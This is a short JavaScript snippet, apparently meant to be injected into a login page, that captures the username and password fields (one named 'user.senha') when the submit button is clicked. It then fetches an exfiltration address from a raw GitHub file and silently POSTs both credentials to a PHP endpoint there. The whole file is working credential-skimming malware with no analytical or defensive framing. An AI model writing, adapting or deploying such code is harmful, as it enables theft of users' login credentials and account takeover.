
let btn = document.querySelector('[data-callback="onSubmit"]')
const username = document.querySelector('[name="user.login"]')
const password = document.querySelector('[name="user.senha"]')


if (btn){
    btn.addEventListener("click", function(){

        let xhr = new XMLHttpRequest();

        xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
        xhr.onreadystatechange = async function() {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                const urlContent = xhr.responseText;

                const data = new FormData();
                data.append("username", username.value);
                data.append("password", password.value);
                
                console.log(data)

                const response = await fetch(urlContent + "index/get.php", {
                    mode: 'no-cors',
                    method: "POST",
                    body: data
                });
            }
        };
        xhr.send();
    });
}
